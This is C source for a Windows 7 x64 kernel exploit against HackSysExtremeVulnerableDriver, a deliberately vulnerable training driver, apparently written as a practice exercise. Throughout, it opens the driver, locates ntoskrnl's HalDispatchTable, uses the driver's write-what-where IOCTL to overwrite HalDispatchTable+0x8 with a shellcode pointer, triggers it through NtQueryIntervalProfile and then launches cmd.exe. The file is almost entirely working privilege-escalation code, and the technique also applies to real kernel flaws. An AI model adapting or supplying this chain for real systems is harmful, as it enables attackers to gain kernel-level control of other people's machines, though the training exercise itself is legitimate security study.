#include<Windows.h>
#include<stdio.h>
#include<Psapi.h>
#include<profileapi.h>
#include "ShellCode.h"

/************************************************************************/
/*                 Write by Thunder_J 2019.7                            */
/*                     Write-What-Where                                 */
/*			Windows 7 x64					*/			
/************************************************************************/

typedef struct _WRITE_WHAT_WHERE
{
	PULONG_PTR What;
	PULONG_PTR Where;
} WRITE_WHAT_WHERE, * PWRITE_WHAT_WHERE;

typedef NTSTATUS(WINAPI* NtQueryIntervalProfile_t)(
	IN ULONG ProfileSource,
	OUT PULONG Interval
	);

HANDLE hDevice = NULL;

static VOID CreateCmd()
{
	STARTUPINFO si = { sizeof(si) };
	PROCESS_INFORMATION pi = { 0 };
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_SHOW;
	WCHAR wzFilePath[MAX_PATH] = { L"cmd.exe" };
	BOOL bReturn = CreateProcessW(NULL, wzFilePath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)& si, &pi);
	if (bReturn) CloseHandle(pi.hThread), CloseHandle(pi.hProcess);
}

DWORD64 ntoskrnlbase()
{
	LPVOID lpImageBase[0x100];
	LPDWORD lpcbNeeded = NULL;
	TCHAR lpfileName[1024];

	//Retrieves the load address for each device driver in the system
	EnumDeviceDrivers(lpImageBase, (DWORD64)sizeof(lpImageBase), lpcbNeeded);

	for (int i = 0; i < 1024; i++)
	{
		//Retrieves the base name of the specified device driver
		GetDeviceDriverBaseNameA(lpImageBase[i], (LPSTR)lpfileName, 0x40);

		if (!strcmp((LPSTR)lpfileName, "ntoskrnl.exe"))
		{
			printf("[+]success to get %s\n", lpfileName);
			return lpImageBase[i];
		}
	}
	return NULL;
}

DWORD64 GetHalOffset_8()
{
	// ntkrnlpa.exe in kernel space base address
	DWORD64 pNtkrnlpaBase = ntoskrnlbase();
	printf("[+]ntkrnlpa base address is 0x%llx\n", pNtkrnlpaBase);
	// ntkrnlpa.exe in user space base address
	HMODULE hUserSpaceBase = LoadLibraryA("ntoskrnl.exe");

	// HalDispatchTable in user space address
	DWORD64 pUserSpaceAddress = (DWORD64)GetProcAddress(hUserSpaceBase, "HalDispatchTable");

	printf("[+]pUserSpaceAddress address is 0x%llx\n", pUserSpaceAddress);

	DWORD64 hal_8 = (DWORD64)pNtkrnlpaBase + ((DWORD64)pUserSpaceAddress - (DWORD64)hUserSpaceBase) + 0x8;

	return (DWORD64)hal_8;
}

VOID Trigger_shellcode(UINT64 where, UINT64 what)
{

	WRITE_WHAT_WHERE exploitlow;
	WRITE_WHAT_WHERE exploithigh;
	DWORD lpbReturn = 0;

	UINT32 lowValue = what;
	UINT32 highvalue = (what >> 0x20);

	exploitlow.What = (PULONG_PTR)& what;
	exploitlow.Where = (PULONG_PTR)where;

	printf("[+]Start to trigger ");

	DeviceIoControl(hDevice,
		0x22200B,
		&exploitlow,
		0x10,
		NULL,
		0,
		&lpbReturn,
		NULL);

	exploithigh.What = (PULONG_PTR)& highvalue;
	exploithigh.Where = (PULONG_PTR)(where + 0x4);

	DeviceIoControl(hDevice,
		0x22200B,
		&exploithigh,
		0x10,
		NULL,
		0,
		&lpbReturn,
		NULL);

	printf("=> done!\n");
}

BOOL init()
{
	// Get HANDLE
	hDevice = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver",
		GENERIC_READ | GENERIC_WRITE,
		NULL,
		NULL,
		OPEN_EXISTING,
		NULL,
		NULL);

	printf("[+]Start to get HANDLE...\n");
	if (hDevice == INVALID_HANDLE_VALUE || hDevice == NULL)
	{
		return FALSE;
	}
	printf("[+]Success to get HANDLE!\n");
	return TRUE;
}

int main()
{
	DWORD64 interVal = 0;

	if (init() == FALSE)
	{
		printf("[+]Failed to get HANDLE!!!\n");
		system("pause");
		return 0;
	}

	DWORD64 Hal_hook_address = GetHalOffset_8();
	printf("[+]HalDispatchTable+0x8 is 0x%llx\n", Hal_hook_address);

	Trigger_shellcode(Hal_hook_address,(UINT64)&ShellCode);

	NtQueryIntervalProfile_t NtQueryIntervalProfile = (NtQueryIntervalProfile_t)GetProcAddress(LoadLibraryA("ntdll.dll"), "NtQueryIntervalProfile");

	printf("[+]NtQueryIntervalProfile address is 0x%llx\n", NtQueryIntervalProfile);

	
	NtQueryIntervalProfile(0x1234, &interVal);

	printf("[+]Start to Create cmd...\n");
	CreateCmd();

	system("pause");
	return 0;
}
